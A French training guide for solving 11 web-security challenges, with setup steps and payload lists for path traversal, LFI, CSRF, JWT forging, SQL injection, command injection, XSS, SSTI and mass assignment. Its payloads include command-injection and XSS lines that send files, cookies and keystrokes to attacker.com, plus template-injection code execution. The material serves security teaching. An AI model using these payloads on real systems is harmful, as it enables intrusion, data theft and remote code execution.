# Guide Méthodologique - Résolution des Challenges

Guide pratique pour résoudre les 11 challenges de sécurité web.

---

## 🛠️ Outils Nécessaires

### Installation des Outils

```bash
# Burp Suite Community (Proxy HTTP)
# Télécharger depuis: https://portswigger.net/burp/communitydownload

# curl (déjà installé sur la plupart des systèmes)
curl --version

# jq (pour formatter JSON)
# Windows avec Chocolatey
choco install jq

# Linux
sudo apt install jq

# Python avec requests
pip install requests colorama

# Extensions de navigateur utiles
# - FoxyProxy (gestion de proxy)
# - Cookie-Editor
# - Wappalyzer (détection de technologies)
```

### Configuration de Burp Suite

1. **Lancer Burp Suite**
2. **Configuration du proxy** :
   - Proxy → Options → 127.0.0.1:8080
3. **Configuration du navigateur** :
   - Installer FoxyProxy
   - Ajouter proxy: 127.0.0.1:8080
4. **Certificat SSL** :
   - Aller sur http://burp
   - Télécharger le certificat CA
   - L'importer dans le navigateur

---

## 📋 Méthodologie Générale

### Phase 1 : Reconnaissance (5-10 min)

```bash
# 1. Observer l'application
# - Naviguer dans toutes les pages
# - Identifier les fonctionnalités
# - Noter les paramètres d'URL

# 2. Identifier les technologies
# - Utiliser Wappalyzer
# - Regarder les headers HTTP
curl -I https://target.com

# 3. Cartographier l'application
# - Créer une liste des endpoints
# - Noter les méthodes HTTP (GET, POST, etc.)
# - Identifier les champs de formulaire
```

### Phase 2 : Test Initial (5 min)

```bash
# Tester les entrées avec des caractères spéciaux
' " < > ; & | ` $ ( ) { } [ ] \ %00

# Observer les réponses
# - Messages d'erreur
# - Changements de comportement
# - Filtrage détecté
```

### Phase 3 : Analyse (10-15 min)

```bash
# Comprendre les protections
# - Quels caractères sont filtrés?
# - Quel est le contexte (HTML, SQL, Shell)?
# - Y a-t-il un WAF (Web Application Firewall)?

# Utiliser Burp Suite
# - Capturer la requête normale
# - Modifier et renvoyer
# - Comparer les réponses
```

### Phase 4 : Exploitation (15-30 min)

```bash
# Construire le payload
# - Commencer simple
# - Augmenter la complexité si filtré
# - Utiliser les techniques de bypass

# Tester le payload
# - Vérifier l'exécution
# - Extraire les données
# - Récupérer le flag
```

### Phase 5 : Documentation (10 min)

```bash
# Capturer les preuves
# - Screenshot de la requête
# - Screenshot de la réponse
# - Screenshot du flag

# Remplir CHALLENGES.md
# - Décrire les étapes
# - Expliquer le payload
# - Ajouter les recommandations
```

---

## 🎯 Guide Par Type de Vulnérabilité

### 1. Path Traversal

#### Checklist
- [ ] Identifier le paramètre de fichier
- [ ] Tester `../` basique
- [ ] Tester encodages : `%2e%2e%2f`, `..%2f`
- [ ] Tester null byte : `%00`
- [ ] Tester double encoding : `%252e%252e%252f`

#### Payloads à Tester
```bash
# Windows
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts

# Linux
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd

# Null byte bypass
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# Double encoding
..%252f..%252f..%252fetc%252fpasswd

# Avec extension forcée
../../../etc/passwd%00
../../etc/passwd%2500.jpg
```

#### Commandes Utiles
```bash
# Test avec curl
curl "http://target.com/download?file=../../../etc/passwd"

# Test avec Burp Suite Intruder
# Position: §file§
# Payload list: path_traversal_payloads.txt
```

---

### 2. Local File Inclusion (PHP Filters)

#### Checklist
- [ ] Identifier le paramètre d'inclusion
- [ ] Tester inclusion basique
- [ ] Tester wrappers PHP
- [ ] Tester data:// wrapper
- [ ] Tester php://input

#### Payloads à Tester
```bash
# PHP Filter - Base64
php://filter/convert.base64-encode/resource=index
php://filter/convert.base64-encode/resource=config
php://filter/convert.base64-encode/resource=/etc/passwd

# ROT13
php://filter/string.rot13/resource=index.php

# data:// wrapper
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=

# expect:// (si activé)
expect://id

# php://input (avec POST)
# POST data: <?php system($_GET['cmd']); ?>
```

#### Script de Test
```python
import requests
import base64

url = "http://target.com/index.php"
files_to_read = ['index', 'config', 'login', '../../../etc/passwd']

for file in files_to_read:
    payload = f"php://filter/convert.base64-encode/resource={file}"
    r = requests.get(url, params={'page': payload})

    if len(r.text) > 100:  # Si contenu
        print(f"\n[+] {file}:")
        try:
            decoded = base64.b64decode(r.text)
            print(decoded.decode())
        except:
            print(r.text[:200])
```

---

### 3. CSRF (Cross-Site Request Forgery)

#### Checklist
- [ ] Identifier la fonctionnalité sensible
- [ ] Vérifier la présence de token CSRF
- [ ] Tester sans token
- [ ] Tester avec token vide
- [ ] Tester avec token d'un autre utilisateur
- [ ] Vérifier le header Referer
- [ ] Vérifier SameSite cookie

#### Test Méthodique
```html
<!-- 1. Test sans token -->
<form action="https://target.com/change-email" method="POST">
    <input name="email" value="hacker@evil.com">
    <!-- Pas de champ csrf_token -->
</form>

<!-- 2. Test avec token vide -->
<form action="https://target.com/change-email" method="POST">
    <input name="email" value="hacker@evil.com">
    <input name="csrf_token" value="">
</form>

<!-- 3. Test sans Referer -->
<html>
<head>
    <meta name="referrer" content="no-referrer">
</head>
<body>
    <form action="..." method="POST" id="csrf">
        <input name="email" value="pwned@evil.com">
    </form>
    <script>document.getElementById('csrf').submit();</script>
</body>
</html>

<!-- 4. Test avec fetch (sans credentials) -->
<script>
fetch('https://target.com/change-email', {
    method: 'POST',
    body: 'email=pwned@evil.com',
    credentials: 'omit'  // Ne pas envoyer les cookies
});
</script>
```

#### Hébergement de la Page Attaquante
```python
# Simple serveur HTTP pour tester
# Créer csrf_exploit.html avec le formulaire

# Lancer le serveur
python -m http.server 8000

# Accéder à http://localhost:8000/csrf_exploit.html
```

---

### 4. JWT (JSON Web Token)

#### Checklist
- [ ] Obtenir un JWT valide
- [ ] Décoder sur jwt.io
- [ ] Tester algorithme "none"
- [ ] Tester HS256 vs RS256 confusion
- [ ] Tester modification du payload
- [ ] Tester réutilisation de token révoqué
- [ ] Brute force la clé secrète (si HS256)

#### Outils
```bash
# Installation de jwt_tool
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt

# Utilisation
python3 jwt_tool.py <JWT>

# Tester les vulnérabilités communes
python3 jwt_tool.py <JWT> -M at

# Modifier le payload
python3 jwt_tool.py <JWT> -I -pc role -pv admin
```

#### Tests Manuels
```python
import jwt
import base64
import json

# 1. Décoder le JWT
token = "eyJhbGc..."
decoded = jwt.decode(token, options={"verify_signature": False})
print(json.dumps(decoded, indent=2))

# 2. Modifier le payload
decoded['role'] = 'admin'
decoded['is_admin'] = True

# 3. Re-signer avec "none"
header = {"alg": "none", "typ": "JWT"}
payload_str = base64.urlsafe_b64encode(
    json.dumps(decoded).encode()
).decode().rstrip('=')
header_str = base64.urlsafe_b64encode(
    json.dumps(header).encode()
).decode().rstrip('=')

forged_token = f"{header_str}.{payload_str}."
print(forged_token)

# 4. Tester la réutilisation
# Obtenir un token, se déconnecter, réutiliser le token
```

---

### 5. SQL Injection

#### Checklist
- [ ] Identifier les paramètres injectables
- [ ] Tester avec `'` (quote)
- [ ] Identifier le type de base de données
- [ ] Déterminer le nombre de colonnes
- [ ] Extraire les données

#### Méthodologie
```sql
-- 1. Test d'injection
' OR 1=1--
' OR '1'='1
admin' OR '1'='1'--

-- 2. Identification du SGBD
' AND 1=1-- (pas d'erreur = MySQL/MariaDB)
' AND 1=1# (MySQL)
' AND 1=1;-- (SQL Server)

-- 3. Nombre de colonnes (ORDER BY)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- Erreur à 4 = 3 colonnes

-- 4. Colonnes affichées (UNION)
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
-- Noter quelles positions sont affichées

-- 5. Extraction de données
' UNION SELECT 1,database(),version()--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,username,password FROM users--
```

#### Error-Based SQLi
```sql
-- EXTRACTVALUE (MySQL)
' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE(), 0x7e))--

-- UPDATEXML (MySQL)
' AND UPDATEXML(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name)
  FROM information_schema.tables WHERE table_schema=DATABASE()), 0x7e), 1)--

-- Extraction progressive (limite de caractères)
' AND EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING((SELECT password FROM users LIMIT 1), 1, 30), 0x7e))--
```

#### Script SQLMap
```bash
# Installation
pip install sqlmap

# Test automatique
sqlmap -u "http://target.com/page?id=1" --batch --dbs

# Extraction de tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Extraction de données
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# Avec POST data
sqlmap -u "http://target.com/login" --data="username=test&password=test" -p username

# Avec cookie
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123" --dbs
```

---

### 6. Command Injection

#### Checklist
- [ ] Identifier les paramètres de commande
- [ ] Tester les séparateurs : `;`, `&&`, `||`, `|`
- [ ] Tester les substitutions : `` ` ``, `$()`
- [ ] Tester les encodages
- [ ] Bypass les filtres d'espaces

#### Payloads de Base
```bash
# Séparateurs
; ls
& ls
&& ls
| ls
|| ls

# Substitution
`ls`
$(ls)

# Newline
%0als
%0acat%20/etc/passwd
```

#### Bypass de Filtres
```bash
# Espace filtré
cat</etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
cat%09/etc/passwd  # Tab
cat%0a/etc/passwd  # Newline

# Slash filtré
cat ${HOME:0:1}etc${HOME:0:1}passwd

# Mots-clés filtrés
c''at /etc/passwd
c\at /etc/passwd
c$@at /etc/passwd
c${u}at /etc/passwd  # Si u est vide

# Wildcards
/???/c?t /???/p??s??
/bin/cat /e??/p*d

# Encodage hexadécimal
echo "63617420 2f6574632f706173 737764" | xxd -r -p | bash

# Base64
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash

# Variables d'environnement
$PATH = /usr/local/sbin:/usr/local/bin:...
${PATH:0:1} = /
```

#### Exfiltration de Données
```bash
# DNS exfiltration
nslookup $(cat /etc/passwd | base64).attacker.com

# HTTP exfiltration
curl https://attacker.com/?data=$(cat /etc/passwd | base64)
wget https://attacker.com/?data=$(cat flag.txt)

# Out-of-band avec netcat
cat /etc/passwd | nc attacker.com 4444
```

---

### 7. XSS (Cross-Site Scripting)

#### Checklist
- [ ] Identifier les points d'injection
- [ ] Tester payload basique
- [ ] Identifier les filtres
- [ ] Bypass avec encodage
- [ ] Bypass avec événements
- [ ] Bypass avec balises alternatives

#### Payloads de Test
```html
<!-- Test basique -->
<script>alert('XSS')</script>

<!-- Sans <script> -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe onload=alert('XSS')>

<!-- Sans parenthèses -->
<img src=x onerror=alert`XSS`>
<img src=x onerror=alert`1`>

<!-- Sans quotes -->
<img src=x onerror=alert(String.fromCharCode(88,83,83))>

<!-- Bypass de mots-clés -->
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycpCg=='))">
<img src=x onerror="window['ale'+'rt']('XSS')">
<img src=x onerror="this['ale'+'rt']('XSS')">

<!-- Encodage HTML -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>

<!-- Bypass CSP (si pas trop strict) -->
<link rel="prefetch" href="https://attacker.com/steal?data="+document.cookie>
<script src="https://attacker.com/xss.js"></script>
```

#### Balises Moins Courantes
```html
<details open ontoggle=alert('XSS')>
<marquee onstart=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<keygen onfocus=alert('XSS') autofocus>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
```

#### Exfiltration de Données
```javascript
// Voler les cookies
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">

// Voler le contenu de la page
<script>
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: document.documentElement.innerHTML
});
</script>

// Keylogger
<script>
document.onkeypress = function(e) {
    fetch('https://attacker.com/keys?k=' + e.key);
};
</script>
```

---

### 8. Server-Side Template Injection (SSTI)

#### Checklist
- [ ] Identifier le point d'injection
- [ ] Tester la détection : `{{7*7}}`
- [ ] Identifier le moteur de template
- [ ] Construire le payload RCE
- [ ] Extraire les données

#### Détection
```python
# Tests de détection
{{7*7}}         # Jinja2, Twig = 49
${7*7}          # Freemarker = 49
<%= 7*7 %>      # ERB = 49
#{ 7*7 }        # Ruby (inline) = 49

# Identifier le moteur
{{7*'7'}}
- Jinja2: 7777777
- Twig: 49
- Freemarker: Erreur
```

#### Exploitation par Moteur

**Jinja2 (Python)**
```python
# Information disclosure
{{config}}
{{self}}
{{''.__class__.__mro__}}

# RCE
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{{''.__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate()}}

# Simplified
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("id").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

**Twig (PHP)**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFilterCallback("system")}}
{{_self.env.getFilter("cat /etc/passwd")}}
```

**Freemarker (Java)**
```java
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("cat /etc/passwd") }

<#assign classloader=object?api.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

---

### 9. API Mass Assignment

#### Checklist
- [ ] Identifier les endpoints API
- [ ] Analyser les modèles de données
- [ ] Tester des champs additionnels
- [ ] Chercher des champs d'admin
- [ ] Exploiter l'élévation de privilèges

#### Méthodologie
```bash
# 1. Requête normale
curl -X POST https://api.target.com/users \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@mail.com"}'

# 2. Énumération de champs
# Champs communs à tester:
# - role, is_admin, admin, privileges
# - verified, is_verified, email_verified
# - credits, balance, points
# - tier, level, rank

# 3. Test avec Burp Suite Intruder
POST /api/users HTTP/1.1
Content-Type: application/json

{
  "name":"test",
  "email":"test@mail.com",
  "§field§":§value§
}

# Payload lists:
# Fields: role, is_admin, verified, credits
# Values: true, "admin", 999999

# 4. Exploitation
curl -X POST https://api.target.com/users \
  -H "Content-Type: application/json" \
  -d '{
    "name":"hacker",
    "email":"hack@mail.com",
    "role":"admin",
    "is_admin":true,
    "credits":999999,
    "verified":true
  }'
```

#### Script d'Énumération
```python
import requests
import json

url = "https://api.target.com/users"

# Champs à tester
fields_to_test = [
    ("role", "admin"),
    ("is_admin", True),
    ("admin", True),
    ("privileges", "admin"),
    ("verified", True),
    ("email_verified", True),
    ("credits", 999999),
    ("balance", 999999),
    ("tier", "premium"),
    ("level", 99)
]

base_data = {
    "name": "test",
    "email": "test@example.com"
}

for field, value in fields_to_test:
    data = base_data.copy()
    data[field] = value

    r = requests.post(url, json=data)

    print(f"\n[*] Testing {field} = {value}")
    print(f"Status: {r.status_code}")
    print(f"Response: {r.text[:200]}")

    if field in r.text:
        print(f"[+] Field {field} accepted!")
```

---

## 📸 Capture de Screenshots

### Outils Recommandés

1. **Burp Suite** : Capture automatique
2. **Snipping Tool** (Windows)
3. **Flameshot** (Linux) : `apt install flameshot`
4. **Screenshots macOS** : Cmd + Shift + 4

### Que Capturer ?

```
Pour chaque challenge, capturer:

1. La requête avec le payload (dans Burp Suite ou navigateur)
2. La réponse du serveur (avec le résultat de l'exploitation)
3. Le flag obtenu
4. (Optionnel) Le code source pertinent si visible
```

### Organisation
```bash
mkdir screenshots
cd screenshots

# Nommer les screenshots clairement
challenge01_request.png
challenge01_response.png
challenge01_flag.png
```

---

## 🎓 Conseils Généraux

### Do's ✅
- Lire TOUT le texte du challenge
- Prendre des notes à chaque étape
- Tester méthodiquement
- Documenter immédiatement après résolution
- Chercher des write-ups similaires (APRÈS avoir essayé)

### Don'ts ❌
- Ne pas abandonner après 10 minutes
- Ne pas copier-coller des payloads sans comprendre
- Ne pas oublier de capturer les screenshots
- Ne pas sauter la documentation

### Si Vous êtes Bloqué
1. Relire l'énoncé du challenge
2. Googler : "[type de vulnérabilité] write-up"
3. Regarder les hints sur la plateforme
4. Faire une pause et revenir plus tard
5. Essayer un autre challenge et revenir

---

## 📚 Ressources par Challenge

### Challenge 1-2: Path Traversal / LFI
- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

### Challenge 3-5: CSRF
- https://portswigger.net/web-security/csrf
- https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html

### Challenge 6: JWT
- https://jwt.io/
- https://github.com/ticarpi/jwt_tool
- https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens

### Challenge 7: SQL Injection
- https://portswigger.net/web-security/sql-injection
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection

### Challenge 8: Command Injection
- https://portswigger.net/web-security/os-command-injection
- https://book.hacktricks.xyz/pentesting-web/command-injection

### Challenge 9: XSS
- https://portswigger.net/web-security/cross-site-scripting
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection

### Challenge 10: SSTI
- https://portswigger.net/web-security/server-side-template-injection
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

### Challenge 11: Mass Assignment
- https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html
- https://owasp.org/API-Security/editions/2019/en/0xa6-mass-assignment/

---

**Bon courage pour la résolution des challenges! 🚀**

**N'oubliez pas** : L'objectif est d'apprendre, pas juste de trouver les flags.
Prenez le temps de comprendre chaque vulnérabilité.
